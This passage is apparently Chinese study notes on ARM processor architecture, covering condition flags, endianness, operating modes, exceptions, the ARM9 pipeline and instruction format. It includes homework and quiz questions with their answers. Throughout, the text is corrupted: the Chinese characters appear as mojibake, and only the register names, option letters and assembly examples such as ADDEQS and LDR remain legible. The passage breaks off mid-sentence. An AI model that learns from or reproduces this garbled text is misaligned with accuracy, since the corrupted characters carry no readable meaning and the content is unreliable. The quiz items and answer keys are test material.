ä¸‹é¢åˆ†ä¸¤ç§æƒ…å†µè®¨è®ºVçš„è®¾ç½®æ–¹æ³•ï¼š â‘  å¯¹äºåŠ /å‡è¿ç®—æŒ‡ä»¤ï¼Œå½“æ“ä½œæ•°å’Œè¿ç®—ç»“æœéƒ½æ˜¯ä»¥äºŒè¿›åˆ¶çš„è¡¥ç è¡¨ç¤ºçš„å¸¦ç¬¦å·çš„æ•°æ—¶ï¼Œä¸”è¿ç®—ç»“æœè¶…å‡ºäº†æœ‰ ç¬¦å·è¿ç®—çš„èŒƒå›´æ—¶æº¢å‡ºã€‚V=1 è¡¨ç¤ºç¬¦å·ä½æº¢å‡ºï¼› â‘¡ å¯¹äºéåŠ /å‡æ³•æŒ‡ä»¤ï¼Œé€šå¸¸ä¸æ”¹å˜æ ‡å¿—ä½ V çš„å€¼ã€‚ ARM å­˜å‚¨ç³»ç»ŸARMæ”¯æŒå¤§ç«¯æ¨¡å¼ï¼ˆbig-endianï¼‰å’Œå°ç«¯æ¨¡å¼ï¼ˆlittle-endianï¼‰ä¸¤ç§å†…å­˜æ¨¡å¼ã€‚ åœ¨å¤§ç«¯æ¨¡å¼ä¸‹ï¼Œä¸€ä¸ªå­—çš„é«˜åœ°å€å•å…ƒæ”¾çš„æ˜¯æ•°æ®çš„ä½ä½ï¼›è€Œåœ¨å°ç«¯æ¨¡å¼ä¸‹ï¼Œæ•°æ®çš„ä½ä½æ”¾åœ¨å†…å­˜ä¸­ä½åœ°å€å•å…ƒä¸­ã€‚ ä¸­æ–­å’Œå¼‚å¸¸çš„åŸºæœ¬æ¦‚å¿µï¼ˆä¸è€ƒï¼‰*ARM çš„å¼‚å¸¸ARMå¤„ç†å™¨å¯ä»¥å“åº”çš„ä¸­æ–­ï¼ˆå¼‚å¸¸ï¼‰æœ‰ï¼šä¸­æ–­ã€å¿«ä¸­æ–­ã€å¤ä½ä¸­æ–­ã€è½¯ä¸­æ–­å¼‚å¸¸ã€é¢„å–æŒ‡ä»¤ä¸­æ­¢å¼‚å¸¸ã€æ•°æ®ä¸­æ­¢å¼‚å¸¸å’Œæœªå®šä¹‰æŒ‡ä»¤å¼‚å¸¸ 7 ç§ã€‚ ä½œä¸šé¢˜ï¼š ä¸€ã€ARM å¤„ç†å™¨æœ‰å‡ ç§å·¥ä½œçŠ¶æ€ï¼Ÿåˆ†åˆ«æ˜¯ä»€ä¹ˆï¼Ÿ ARM å¤„ç†å™¨æœ‰ä¸¤ç§å·¥ä½œçŠ¶æ€ï¼šARM çŠ¶æ€å’Œ Thumb çŠ¶æ€ã€‚ äºŒã€ARM å¤„ç†å™¨æœ‰å‡ ç§è¿è¡Œæ¨¡å¼ï¼Ÿåˆ†åˆ«æ˜¯ä»€ä¹ˆï¼Ÿ ARM å¤„ç†å™¨æœ‰ 7 ç§è¿è¡Œæ¨¡å¼ï¼šç”¨æˆ·æ¨¡å¼ã€ç³»ç»Ÿæ¨¡å¼ã€ä¸€èˆ¬ä¸­æ–­æ¨¡å¼ã€å¿«é€Ÿä¸­æ–­æ¨¡å¼ã€ç®¡ç†æ¨¡å¼ã€ä¸­æ­¢æ¨¡å¼å’Œæœªå®šä¹‰æ¨¡å¼ã€‚ ä¸‰ã€ç®€å•æè¿° ARM ä½“ç³»ç»“æ„ä¸çº¯ç²¹çš„ RISC ä½“ç³»ç»“æ„çš„ä¸åŒç‚¹ã€‚ ARM å†…æ ¸ä¸æ˜¯ä¸€ä¸ªçº¯ç²¹çš„ RISC ä½“ç³»ç»“æ„ã€‚ARM æŒ‡ä»¤é›†ä¸çº¯ç²¹çš„ RISC çš„å®šä¹‰æœ‰ä»¥ä¸‹å‡ ä¸ªä¸åŒã€‚ ï¼ˆ1ï¼‰ä¸€äº›ç‰¹å®šæŒ‡ä»¤çš„å‘¨æœŸæ•°å¯å˜ï¼Œå¹¶ä¸æ˜¯æ¯æ¡ ARM æŒ‡ä»¤éƒ½æ˜¯å•å‘¨æœŸçš„ã€‚ ï¼ˆ2ï¼‰å†…åµŒçš„æ¡¶å½¢ç§»ä½å™¨äº§ç”Ÿäº†æ›´ä¸ºå¤æ‚çš„æŒ‡ä»¤ï¼Œæ‰©å±•äº†æŒ‡ä»¤çš„åŠŸèƒ½ï¼Œå› æ­¤æ”¹å–„äº†å†…æ ¸çš„æ€§èƒ½ã€‚ ï¼ˆ3ï¼‰æ”¯æŒ 16 ä½çš„ Thumb æŒ‡ä»¤é›†ï¼Œæé«˜äº†ä»£ç å¯†åº¦ã€‚ ï¼ˆ4ï¼‰æ”¯æŒæ¡ä»¶æ‰§è¡Œï¼šæ¯æ¡æŒ‡ä»¤éƒ½å¯ä»¥è®¾ç½®ä¸€ä¸ªæ‰§è¡Œæ¡ä»¶ï¼Œåªæœ‰æ¡ä»¶æ»¡è¶³æ—¶æ‰æ‰§è¡Œã€‚ ï¼ˆ5ï¼‰å¢å¼ºæŒ‡ä»¤ï¼šä¸€äº›åŠŸèƒ½å¼ºå¤§çš„æ•°å­—ä¿¡å·å¤„ç†æŒ‡ä»¤è¢«åŠ å…¥åˆ° ARM æŒ‡ä»¤é›†ä¸­ã€‚ å››ã€ç®€å•æè¿° ARM9 çš„ 5 çº§æµæ°´çº¿ å–æŒ‡ï¼šæŒ‡ä»¤ä»å­˜å‚¨å™¨ä¸­å–å‡ºï¼Œæ”¾å…¥æŒ‡ä»¤æµæ°´çº¿ï¼› è¯‘ç ï¼šæŒ‡ä»¤è¯‘ç ï¼› æ‰§è¡Œï¼šæŠŠä¸€ä¸ªæ“ä½œæ•°ç§»ä½ï¼Œäº§ç”Ÿ ALU çš„ç»“æœã€‚å¦‚æœæŒ‡ä»¤æ˜¯ Load æˆ– Storeï¼Œåœ¨ ALU ä¸­è®¡ç®—å­˜å‚¨å™¨çš„åœ°å€ï¼› ç¼“å­˜/æ•°æ®ï¼šå¦‚æœéœ€è¦ï¼Œåˆ™è®¿é—®æ•°æ®å­˜å‚¨å™¨ï¼›å¦åˆ™ï¼ŒALU çš„ç»“æœåªæ˜¯ç®€å•åœ°ç¼“å†²ä¸€ä¸ªæ—¶é’Ÿå‘¨æœŸï¼Œä»¥ä¾¿ä½¿æ‰€æœ‰æŒ‡ä»¤å…·æœ‰åŒæ ·çš„æµæ°´çº¿æµç¨‹ï¼› å›å†™ï¼šå°†æŒ‡ä»¤äº§ç”Ÿçš„ç»“æœå†™å›åˆ°å¯„å­˜å™¨å †ï¼ŒåŒ…æ‹¬ä»»ä½•ä»å¯„å­˜å™¨è¯»å‡ºçš„æ•°æ®ã€‚ äº”ã€ç®€å•æè¿° ARM å¤„ç†å™¨è¿›å…¥å¼‚å¸¸æ‰€é‡‡å–çš„æ“ä½œã€‚ (1) åœ¨é€‚å½“çš„ LR ä¸­ä¿å­˜æ–­ç‚¹çš„åœ°å€ã€‚ (2) æŠŠå½“å‰ç¨‹åºçŠ¶æ€å¯„å­˜å™¨ï¼ˆCPSRï¼‰ä¸­çš„å†…å®¹ä¿å­˜åˆ°æ¨¡å¼ç§æœ‰å¯„å­˜å™¨ SPSR ä¸­ï¼› (3) å°†å¯„å­˜å™¨ CPSR ä¸­çš„ MODE åŸŸè®¾ç½®ä¸ºä¸­æ–­ï¼ˆå¼‚å¸¸ï¼‰åº”è¿›å…¥çš„è¿è¡Œæ¨¡å¼ï¼› (4) å¯¹ CPSR çš„ I ä½å’Œ F ä½è¿›è¡Œç›¸åº”çš„è®¾ç½®ï¼Œä»¥é˜²æ­¢å†æ¬¡å“åº”åŒä¸€ä¸ªä¸­æ–­è¯·æ±‚ã€‚ (5) å¼ºåˆ¶ PC ä»ç›¸å…³çš„å¼‚å¸¸å‘é‡å¤„å–æŒ‡ï¼Œå³åˆ°ä¸­æ–­å‘é‡è¡¨ä¸­è·å–ä¸­æ–­å‘é‡ï¼Œè½¬å‘ç”¨æˆ·æ‰€ç¼–å†™çš„ä¸­æ–­ï¼ˆå¼‚å¸¸ï¼‰æœåŠ¡ç¨‹åºã€‚ å…­ã€ARM çš„å¿«ä¸­æ–­ï¼ˆFIQï¼‰é‡‡ç”¨äº†å‡ ç§æªæ–½æ¥ä¿è¯æ›´å¿«çš„å“åº”é€Ÿåº¦ï¼Ÿè¿™äº›æªæ–½æ˜¯ä»€ä¹ˆï¼Ÿ ä¸ºå‡å°‘å»¶æ—¶ï¼ŒARM åœ¨å¿«ä¸­æ–­ä¸­é‡‡å–äº† ä¸¤ä¸ªæªæ–½ï¼š ï¼ˆ1ï¼‰ä¸“é—¨ä¸ºå¿«ä¸­æ–­é…ç½®äº†è¾ƒå¤šçš„ç§æœ‰å¯„å­˜å™¨ï¼Œä»è€Œå¯ä½¿ä¸­æ–­æœåŠ¡ç¨‹åºæœ‰è¶³å¤Ÿçš„å¯„å­˜å™¨æ¥ä½¿ç”¨ï¼Œè€Œä¸å¿…ä¸è¢«ä¸­æ–­æœåŠ¡ç¨‹åºä½¿ç”¨åŒä¸€ç»„å¯„å­˜å™¨ï¼Œè¿™æ ·å°±å…å»äº†å› å¯„å­˜å™¨å†²çªè€Œå¿…éœ€çš„ä¿æŠ¤åŠæ¢å¤ç°åœºå·¥ä½œã€‚ ï¼ˆ2ï¼‰ARM æŠŠ FIQ çš„ä¸­æ–­å‘é‡æ”¾åœ¨äº†ä¸­æ–­ï¼ˆå¼‚å¸¸ï¼‰å‘é‡è¡¨æœ«å°¾ 0X0000001C å¤„ï¼Œå› æ­¤å®ƒåé¢æ²¡æœ‰å…¶å®ƒä¸­æ–­å‘é‡ï¼Œå…è®¸ç”¨æˆ·å°†ä¸­æ–­æœåŠ¡ç¨‹åºç›´æ¥æ”¾åœ¨è¿™é‡Œã€‚ ä¸ƒã€å¤šé€‰é¢˜ ä¸ºå‡å°‘å»¶æ—¶ï¼Œæé«˜ä¸­æ–­å¤„ç†é€Ÿåº¦ï¼ŒARM åœ¨å¿«ä¸­æ–­ä¸­é‡‡å–äº†å“ªäº›æªæ–½ï¼ˆ Bã€D ï¼‰ A. é…ç½®äº†é«˜é€Ÿç¼“å­˜ã€‚ B. é…ç½®äº†è¾ƒå¤šçš„ç§æœ‰å¯„å­˜å™¨ã€‚ C. æ›´é«˜çš„ä¸­æ–­ä¼˜å…ˆçº§ã€‚ D. æŠŠ FIQ çš„ä¸­æ–­å‘é‡æ”¾åœ¨äº†ä¸­æ–­ï¼ˆå¼‚å¸¸ï¼‰å‘é‡è¡¨æœ«å°¾å¤„ã€‚ ä¸‹åˆ—è¯´æ³•æ­£ç¡®çš„æ˜¯ï¼ˆ Aã€Bã€Cã€D ï¼‰ã€‚ A. å¼‚å¸¸å®è´¨ä¸Šä¹Ÿæ˜¯ä¸€ç§ä¸­æ–­ï¼Œåªä¸è¿‡å®ƒä¸»è¦è´Ÿè´£å¤„ç†å¤„ç†å™¨å†…éƒ¨äº‹ä»¶ B. ä¸­æ–­æ§åˆ¶å™¨ç”¨äºä¸­æ–­æºå’Œå¤„ç†å™¨ä¹‹é—´ï¼Œä¸»è¦ç”¨äºå¯¹å¤„ç†å™¨å¯ä»¥æ¥æ”¶ä¸­æ–­æºçš„æ•°ç›®è¿›è¡Œæ‰©å……åŠå¯¹ä¸­æ–­è¿›è¡Œå¿…è¦çš„ç®¡ç†ã€‚ C. å¤„ç†å™¨åœ¨ç°è¡ŒæŒ‡ä»¤æ‰§è¡Œç»“æŸåï¼Œæ‰èƒ½å“åº”ä¸­æ–­ã€‚ D. åœ¨å¤„ç†å™¨æ”¶åˆ°ä¸­æ–­è¯·æ±‚ä¹‹åï¼Œå®ƒä»¬éƒ½éœ€è¦è·å¾—ä¸­æ–­æœåŠ¡ç¨‹åºé¦–åœ°å€â€”â€”ä¸­æ–­å‘é‡ã€‚ ä¸‹åˆ—å…³äº ARM çš„è¯´æ³•æ­£ç¡®çš„æ˜¯ï¼ˆ Bã€Cã€D ï¼‰ A. ARM å…¬å¸ç”Ÿäº§çš„å¤„ç†å™¨ B. ARM æ˜¯ä¸€ä¸ªå…¬å¸çš„åç§° C. ARM æ˜¯ä¸€ç±»å¾®å¤„ç†å™¨çš„é€šç§° D. ARM æ˜¯ä¸€ç§æŠ€æœ¯çš„åç§° å…«ã€åˆ¤æ–­é¢˜ ARM9TDMI æ ¸å…¶å·¥ä½œæ¨¡å¼æœ‰ä¸¤ç§ï¼šARM æ¨¡å¼å’Œ Thumb æ¨¡å¼ã€‚ï¼ˆ X ï¼‰ å½“å¼‚å¸¸å‘ç”Ÿï¼Œè¿›å…¥å¼‚å¸¸è¿è¡Œæ¨¡å¼çš„æ—¶å€™ï¼Œå¤„ç†å™¨ä¼šè‡ªåŠ¨ç¦ç”¨ä¸­æ–­å’Œå¿«ä¸­æ–­ï¼Œä»¥ç¡®ä¿å¼‚å¸¸å¤„ç†ç¨‹åºå®‰å…¨è¿è¡Œã€‚ï¼ˆ X ï¼‰ å½“å¤„ç†å™¨å¤„äº Thumb çŠ¶æ€æ—¶å‘ç”Ÿäº†å¼‚å¸¸ï¼Œåœ¨å¼‚å¸¸å‘é‡åœ°å€è£…å…¥ PC æ—¶ï¼Œä¼šè‡ªåŠ¨åˆ‡æ¢åˆ°ARM çŠ¶æ€ã€‚ï¼ˆ âˆš ï¼‰ S3C2440 èŠ¯ç‰‡å¯ä»¥é€šè¿‡è½¯ä»¶æ¥æŒ‡å®šå­˜å‚¨å™¨æ ¼å¼ï¼Œç¼ºçœä¸ºå°ç«¯æ ¼å¼ã€‚ï¼ˆ âˆš ï¼‰ åœ¨å‡æ³•æŒ‡ä»¤ä¸­ï¼Œå½“è¿ç®—ä¸­å‘ç”Ÿäº†å€Ÿä½ï¼Œåˆ™ C æ ‡å¿—ä½=1ã€‚ï¼ˆ X ï¼‰ ARM å¤„ç†å™¨åœ¨ç”¨æˆ·æ¨¡å¼ä¸‹ï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹ CPSR è¿›å…¥ç³»ç»Ÿæ¨¡å¼ã€‚ï¼ˆ X ï¼‰ å¯¹äºè®¡ç®—æœºç³»ç»Ÿæ¥è¯´ï¼Œä¸€ä¸ªå­—çš„é•¿åº¦æ˜¯ 32 ä½çš„ï¼ŒåŠå­—çš„é•¿åº¦æ˜¯ 16 ä½çš„ã€‚ï¼ˆ X ï¼‰ ARM920T å¤„ç†å™¨ä¸­ï¼Œå¯¹æ˜¯é€šè¿‡åå¤„ç†å™¨ P15 æ¥å®ç°å¯¹ MMU çš„æ§åˆ¶çš„ã€‚ï¼ˆ âˆš ï¼‰ ARM9 çš„ 5 çº§æµæ°´çº¿è®¾è®¡ï¼Œç›¸å¯¹äº ARM7 çš„ 3 çº§æµæ°´çº¿è®¾è®¡ï¼Œå‡å°‘äº†åœ¨æ¯ä¸ªæ—¶é’Ÿå†…å¿…é¡»å®Œæˆçš„æœ€å¤§å·¥ä½œé‡ï¼Œè¿›è€Œå…è®¸ä½¿ç”¨è¾ƒé«˜çš„æ—¶é’Ÿé¢‘ç‡ã€‚ï¼ˆ âˆš ï¼‰ ARMå¤„ç†å™¨é‡‡ç”¨çš„æ˜¯RISCä½“ç³»ç»“æ„ï¼Œå› æ­¤æ‰€æœ‰çš„æŒ‡ä»¤éƒ½åœ¨ä¸€ä¸ªå‘¨æœŸå†…æ‰§è¡Œå®Œæˆã€‚ï¼ˆ X ï¼‰ ä¹ã€å•é€‰é¢˜ å¦‚æœå¤„ç†å™¨é‡‡ç”¨å¤§ç«¯å­˜å‚¨å™¨æ ¼å¼ï¼Œå‡å¦‚ä¸€ä¸ªå­—å­˜æ”¾åœ¨åœ°å€ä¸º Aã€A+1ã€A+2ã€A+3 å››ä¸ªè¿ç»­çš„å­˜å‚¨å•å…ƒä¸­ï¼Œåˆ™è¯¥å­—çš„åœ°å€ä¸ºï¼ˆ A ï¼‰å¤§ç«¯ä¸‹è¯¥å­—çš„åœ°å€å®šä¹‰ä¸ºæœ€ä½åœ°å€ Aï¼A Bï¼A+1 Cï¼A+2 Dï¼A+3 ARM7EJ åç§°ä¸­çš„ J åç¼€ï¼Œä»£è¡¨ï¼ˆ C ï¼‰ Aã€æ”¯æŒå¢å¼ºå‹ DSP æŒ‡ä»¤ Bã€æ”¯æŒ Thumb æŒ‡ä»¤é›† Cã€æ”¯æŒ Jazelle Dã€æ”¯æŒ Embedded ICE åœ¨é€šç”¨çš„ CPU ä¸Šæä¾› DSP èƒ½åŠ›ï¼Œæ˜¯ä» ARM æŒ‡ä»¤é›†æ„ä½“ç³»ç»“æ„ç‰ˆæœ¬ï¼ˆ B ï¼‰ä»¥åå¼€å§‹çš„ã€‚ Aã€v4 Bã€v5 Cã€v6 Dã€v7 ARM æ¨å‡ºçš„ Cortex ç³»åˆ—åŒ…æ‹¬ä¸‰ä¸ªç³»åˆ—ï¼Œå…¶ä¸­å®æ—¶æ“ä½œç³»ç»Ÿè€Œè®¾è®¡çš„æ˜¯ï¼ˆ C ï¼‰ Aã€Cortex-A Bã€Cortex-B Cã€Cortex-R Dã€Cortex-M åœ¨ ARM9 çš„ 5 çº§æµæ°´çº¿è®¾è®¡ä¸­ï¼Œä»å¯„å­˜å™¨ä¸­è¯»å–æ“ä½œæ•°ï¼Œæ˜¯åœ¨å“ªä¸ªé˜¶æ®µå®Œæˆçš„ï¼Ÿï¼ˆ B ï¼‰ Aã€å–æŒ‡ Bã€è¯‘ç  Cã€æ‰§è¡Œ Dã€ç¼“å­˜/æ•°æ® Eã€å›å†™ åœ¨ ARM9 çš„ 5 çº§æµæ°´çº¿è®¾è®¡ä¸­ï¼Œè®¡ç®—è®¿å­˜æŒ‡ä»¤è®¿é—®å­˜å‚¨å™¨çš„åœ°å€çš„æ“ä½œï¼Œæ˜¯åœ¨å“ªä¸ªé˜¶æ®µå®Œæˆçš„ï¼Ÿï¼ˆ C ï¼‰ Aã€å–æŒ‡ Bã€è¯‘ç  Cã€æ‰§è¡Œ Dã€ç¼“å­˜/æ•°æ® Eã€å›å†™ ARM å¤„ç†å™¨çš„ 7 ç§è¿è¡Œæ¨¡å¼ä¸­ï¼Œå¤„ç†å™¨å¤ä½ä¹‹åè¿›å…¥ï¼ˆ C ï¼‰ã€‚ Aï¼ç”¨æˆ·æ¨¡å¼ Bï¼ç³»ç»Ÿæ¨¡å¼ Cï¼ç®¡ç†æ¨¡å¼ Dï¼ç»ˆæ­¢æ¨¡å¼ ä¸‹åˆ— ARM å¤„ç†å™¨çš„è¿è¡Œæ¨¡å¼ä¸­ï¼Œä¸å±äºå¼‚å¸¸æ¨¡å¼çš„æ˜¯ï¼ˆ B ï¼‰ã€‚ Aï¼æœªå®šä¹‰æ¨¡å¼ Bï¼ç³»ç»Ÿæ¨¡å¼ Cï¼ç®¡ç†æ¨¡å¼ Dï¼ç»ˆæ­¢æ¨¡å¼ã€‚ R13 é€šå¸¸ç”¨äºå­˜å‚¨ï¼ˆ D ï¼‰ã€‚ Aï¼ç¨‹åºè®¡æ•°å™¨ Bï¼ä¸­æ–­è¿”å›åœ°å€ Cï¼å­ç¨‹åºè¿”å›åœ°å€ Dï¼å †æ ˆæŒ‡é’ˆ ç¨‹åºè®¡æ•°å™¨çš„å€¼ä¿å­˜åœ¨ï¼ˆ D ï¼‰ä¸­ã€‚ Aï¼R12 Bï¼R13 Cï¼R14 Dï¼R15 è¯»ç¨‹åºè®¡æ•°å™¨æ—¶ï¼ŒæŒ‡ä»¤è¯»å‡ºçš„ R15 çš„å€¼æ˜¯å½“å‰æŒ‡ä»¤åœ°å€åŠ ä¸Šï¼ˆ D ï¼‰å­—èŠ‚ã€‚ Aï¼1 Bï¼2 Cï¼4 Dï¼8 ARM æŒ‡ä»¤é›†ARM æŒ‡ä»¤é›†ç®€ä»‹ARMå¾®å¤„ç†å™¨çš„ARMæŒ‡ä»¤é›† ï¼Œæ‰€æœ‰çš„æŒ‡ä»¤é•¿åº¦éƒ½æ˜¯32ä½ ï¼Œå¹¶ä¸”å¤§å¤šæ•°æŒ‡ä»¤éƒ½åœ¨ä¸€ä¸ªå•ç‹¬æŒ‡ä»¤å‘¨æœŸå†…æ‰§è¡Œã€‚ ä¸»è¦ç‰¹ç‚¹åŒ…æ‹¬ï¼š æŒ‡ä»¤æ˜¯æ¡ä»¶æ‰§è¡Œçš„ï¼› ARM å¾®å¤„ç†å™¨çš„æŒ‡ä»¤é›†æ˜¯åŠ è½½/å­˜å‚¨å‹çš„ï¼› åœ¨å¤šå¯„å­˜å™¨æ“ä½œæŒ‡ä»¤ä¸­ä¸€æ¬¡æœ€å¤šå¯ä»¥å®Œæˆ 16 ä¸ªå¯„å­˜å™¨çš„æ•°æ®ä¼ é€ã€‚ ARM æŒ‡ä»¤æ ¼å¼ä¸€ã€æŒ‡ä»¤çš„ä¸€èˆ¬æ ¼å¼ 1&lt;opcode&gt; {&lt;cond&gt;} {S} {&lt;Rd&gt;} {, &lt;Rn&gt;} {, &lt;OP2&gt;} æ ¼å¼ä¸­ &lt; &gt; çš„å†…å®¹å¿…ä¸å¯å°‘ï¼Œ{ } ä¸­çš„å†…å®¹å¯çœç•¥ã€‚ opcode è¡¨ç¤ºæ“ä½œç ï¼Œå¦‚ ADD è¡¨ç¤ºç®—æœ¯åŠ æ³•ï¼›cond è¡¨ç¤ºæŒ‡ä»¤æ‰§è¡Œçš„æ¡ä»¶åŸŸï¼Œå¦‚ EQã€NE ç­‰ã€‚ { S } å†³å®šæŒ‡ä»¤çš„æ‰§è¡Œç»“æœæ˜¯å¦å½±å“ CPSR çš„å€¼ï¼Œä½¿ç”¨è¯¥åç¼€åˆ™æŒ‡ä»¤æ‰§è¡Œçš„ç»“å°†æœå½±å“ CPSR çš„å€¼ï¼Œå¦åˆ™ä¸å½±å“ã€‚ Rd è¡¨ç¤ºç›®æ ‡å¯„å­˜å™¨å­˜å‚¨ç»“æœï¼›Rn ä¸ºå¯„å­˜å™¨æä¾›ç¬¬ä¸€ä¸ªæ“ä½œæ•°ï¼›OP2 è¡¨ç¤ºç¬¬äºŒä¸ªæ“ä½œæ•°ï¼Œå¯ä»¥æ˜¯ç«‹å³æ•°ã€å¯„å­˜å™¨å’Œå¯„å­˜å™¨ç§»ä½æ“ä½œæ•°ã€‚ åœ¨æŒ‡ä»¤æ ¼å¼ä¸­ï¼Œæ“ä½œç ï¼ˆopcodeï¼‰æ˜¯å¿…é¡»æŒ‡å®šçš„éƒ¨åˆ†ï¼Œä¸èƒ½çœç•¥ï¼Œè€Œå…¶ä»–éƒ¨åˆ†ï¼ˆå¦‚ condã€Sã€Rdã€Rnã€OP2ï¼‰éƒ½æ˜¯å¯é€‰çš„ï¼Œå¯ä»¥æ ¹æ®éœ€è¦é€‰æ‹©æ˜¯å¦åŒ…å«åœ¨æŒ‡ä»¤ä¸­ã€‚æ¢å¥è¯è¯´ï¼Œé™¤äº†æ“ä½œç å¤–ï¼Œå…¶ä»–åŸŸå¯ä»¥æ ¹æ®å…·ä½“æŒ‡ä»¤çš„éœ€æ±‚çœç•¥æˆ–ä½¿ç”¨ã€‚ ä¾‹å¦‚ï¼šæŒ‡ä»¤ ADDEQS R0, R1, #8; æ‰§è¡Œç»“æœ R0 = R1 + 8ã€‚LDR R3, [R6]ï¼šå°† R6 å¯„å­˜å™¨å†…å®¹æ‰€æŒ‡å‘çš„å­˜å‚¨å•å…ƒå†…å®¹è¯»å‡ºï¼Œä¿å­˜åœ¨ R3 ä¸­ï¼Œæ‰§è¡Œæ¡ä»¶ ALã€‚BEQ NEXTï¼šåˆ†æ”¯æŒ‡ä»¤Bï¼ŒåŠ ä¸Šåç¼€EQï¼Œå˜ä¸ºBEQï¼Œè¡¨ç¤ºâ€œæ»¡è¶³æ¡ä»¶ç›¸ç­‰åˆ™è·³è½¬â€ ã€‚ADD R0ï¼ŒR1ï¼Œ#2 åŠ æ³•æŒ‡ä»¤ADDï¼ŒR0=R1+2ï¼Œä¸å¸¦Sï¼Œè®¡ç®—ç»“æœä¸å½±å“CPSRå¯„å­˜å™¨ã€‚SUBNES R0ï¼ŒR1ï¼Œ#0X03æ¡ä»¶æ‰§è¡Œå‡æ³•è¿ç®—ï¼ˆNEï¼‰ï¼ŒR0=R1-0X03ï¼Œå½±å“CPSRå¯„å­˜å™¨ã€‚ äºŒã€æŒ‡ä»¤çš„æœºå™¨ç  ä»å½¢å¼ä¸Šçœ‹ï¼ŒARMæŒ‡ä»¤åœ¨æœºå™¨ä¸­çš„è¡¨ç¤ºæ ¼å¼æ˜¯ç”¨32ä½çš„äºŒè¿›åˆ¶æ•°è¡¨ç¤ºã€‚ ARMæŒ‡ä»¤ä»£ç ä¸€èˆ¬å¯ä»¥åˆ†ä¸º5ä¸ªåŸŸï¼š ç¬¬1ä¸ªåŸŸæ˜¯4ä½[31:28]çš„æ¡ä»¶ç åŸŸï¼Œ4ä½æ¡ä»¶ç å…±æœ‰16ç§ç»„åˆï¼› ç¬¬2ä¸ªåŸŸæ˜¯æŒ‡ä»¤ä»£ç åŸŸ[27:20],é™¤äº†æŒ‡ä»¤ç¼–ç å¤–ï¼Œè¿˜åŒ…å«å‡ ä¸ªå¾ˆé‡è¦çš„æŒ‡ä»¤ç‰¹å¾å’Œå¯é€‰åç¼€çš„ç¼–ç  ç¬¬3ä¸ªåŸŸæ˜¯ç¬¬1ä¸ªæ“ä½œæ•°å¯„å­˜å™¨Rnï¼Œæ˜¯4ä½[19:16],ä¸ºR0ï½R15å…±16ä¸ªå¯„å­˜å™¨ç¼–ç ï¼› ç¬¬4ä¸ªåŸŸæ˜¯ç›®æ ‡æˆ–æºå¯„å­˜å™¨Rdï¼Œæ˜¯4ä½[15:12],ä¸ºR0ï½R15å…±16ä¸ªå¯„å­˜å™¨ç¼–ç ï¼› ç¬¬5ä¸ªåŸŸæ˜¯ç¬¬äºŒä¸ªæ“ä½œæ•°[11:0]ã€‚ ä¸‰ã€æŒ‡ä»¤çš„å¯é€‰åç¼€ 1ï¼‰Såç¼€ æŒ‡ä»¤ä¸­ä½¿ç”¨Såç¼€æ—¶ï¼ŒæŒ‡ä»¤æ‰§è¡Œåç¨‹åºçŠ¶æ€å¯„å­˜å™¨çš„æ¡ä»¶æ ‡å¿—ä½å°†è¢«åˆ·æ–°ï¼Œä¸ä½¿ç”¨Såç¼€æ—¶ï¼ŒæŒ‡ä»¤æ‰§è¡Œåç¨‹åºçŠ¶æ€å¯„å­˜å™¨CPSRçš„æ¡ä»¶æ ‡å¿—å°†ä¸ä¼šå‘ç”Ÿå˜åŒ–ã€‚ ä¾‹:å‡è®¾R0=0x1,R3=0x3,æŒ‡ä»¤æ‰§è¡Œä¹‹å‰CPSRéƒ¨åˆ†æ ‡å¿—ä½ä¸ºnZcv,åˆ†åˆ«æ‰§è¡Œå¦‚ä¸‹æŒ‡ä»¤CPSRçš„å€¼æœ‰ä½•å˜åŒ–ï¼Ÿ SUB R1,R0,R3ï¼› R0çš„å€¼å‡å»R3çš„å€¼ï¼Œç»“æœå­˜å…¥R1 SUBS R1,R0,R3ï¼› R0çš„å€¼å‡å»R3çš„å€¼ï¼Œç»“æœå­˜å…¥R1ï¼› å½±å“æ ‡å¿—ä½ã€‚ åˆ†æï¼šæ‰§è¡Œç¬¬1æ¡æŒ‡ä»¤å¯¹äºæ ‡å¿—å¯„å­˜å™¨çš„å€¼æ²¡æœ‰ä»»ä½•å½±å“ï¼Œå› æ­¤CPSRçš„å€¼ä¸å˜ã€‚æ‰§è¡Œç¬¬2æ¡æŒ‡ä»¤åCPSR=Nzcv 2ï¼‰ï¼åç¼€ å¦‚æœæŒ‡ä»¤åœ°å€è¡¨è¾¾å¼ä¸­ä¸å«ï¼åç¼€ï¼Œåˆ™åŸºå€å¯„å­˜å™¨ä¸­çš„åœ°å€å€¼ä¸ä¼šå‘ç”Ÿå˜åŒ–ã€‚ æŒ‡ä»¤ä¸­çš„åœ°å€è¡¨è¾¾å¼ä¸­å«æœ‰!åç¼€æ—¶ï¼ŒæŒ‡ä»¤æ‰§è¡Œåï¼ŒåŸºå€å¯„å­˜å™¨ä¸­çš„åœ°å€å€¼å°†å‘ç”Ÿå˜åŒ–ï¼Œå˜åŒ–çš„ç»“æœå¦‚ä¸‹ï¼š åŸºå€å¯„å­˜å™¨ä¸­çš„å€¼ï¼ˆæŒ‡ä»¤æ‰§è¡Œåï¼‰ï¼æŒ‡ä»¤æ‰§è¡Œå‰çš„å€¼ï¼‹åœ°å€åç§»é‡ ä¾‹ åˆ†åˆ«æ‰§è¡Œä¸‹é¢ä¸¤æ¡æŒ‡ä»¤æœ‰ä½•åŒºåˆ«ï¼Ÿ LDR R3,[R0,#4] LDR R3,[R0,#4]ï¼ åˆ†æï¼šåœ¨ä¸Šè¿°æŒ‡ä»¤ä¸­ï¼Œç¬¬1æ¡æŒ‡ä»¤æ²¡æœ‰åç¼€ï¼ï¼ŒæŒ‡ä»¤çš„ç»“æœæ˜¯æŠŠR0åŠ 4ä½œä¸ºåœ°å€æŒ‡é’ˆï¼ŒæŠŠè¿™ä¸ªæŒ‡é’ˆæ‰€æŒ‡å‘çš„åœ°å€å•å…ƒæ‰€å­˜å‚¨çš„æ•°æ®è¯»å…¥R3ï¼ŒR0çš„å€¼ä¸å˜ã€‚ç¬¬2æ¡æŒ‡ä»¤é™¤äº†å®ç°ä»¥ä¸Šæ“ä½œå¤–ï¼Œè¿˜æŠŠR0ï¼‹4çš„ç»“æœé€åˆ°R0ä¸­ã€‚ ä½¿ç”¨!åç¼€éœ€è¦æ³¨æ„å¦‚ä¸‹äº‹é¡¹ï¼š (1)ï¼åç¼€å¿…é¡»ç´§è·Ÿåœ¨åœ°å€è¡¨è¾¾å¼åé¢ï¼Œè€Œåœ°å€è¡¨è¾¾å¼è¦æœ‰æ˜ç¡®çš„åœ°å€åç§»é‡ï¼› (2)! 